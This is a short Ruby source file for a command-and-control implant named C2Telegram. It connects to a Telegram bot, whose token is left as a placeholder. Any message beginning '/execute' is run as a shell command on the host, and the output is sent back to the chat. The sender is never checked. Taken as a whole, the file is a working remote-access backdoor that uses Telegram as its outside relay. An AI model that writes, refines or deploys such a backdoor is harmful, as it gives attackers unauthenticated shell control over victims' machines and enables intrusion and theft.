require 'telegram/bot'
require 'eventmachine'

class C2Telegram
  def initialize
    @bot_token = "Tokeniniz"
  end

  def execute(cmd)
    `#{cmd}`
  end

  def listen
    Telegram::Bot::Client.run(@bot_token) do |bot|
      bot.listen do |message|
        if message.text.start_with?('/')
          bot_cmd, arguments = message.text.scan(/^\/([^\s]+)\s?(.+)?/).flatten
          case bot_cmd.downcase
          when 'execute'
            unless arguments.nil?
              bot.api.send_message(chat_id: message.chat.id, text: "> #{arguments}\n#{execute(arguments)}")
            else
              bot.api.send_message(chat_id: message.chat.id, text: "Error")
            end
          end
        end
      end
    end
  end

  def main
    listen
  end
end

EM.run do
  bot_instance = C2Telegram.new
  bot_instance.main
end
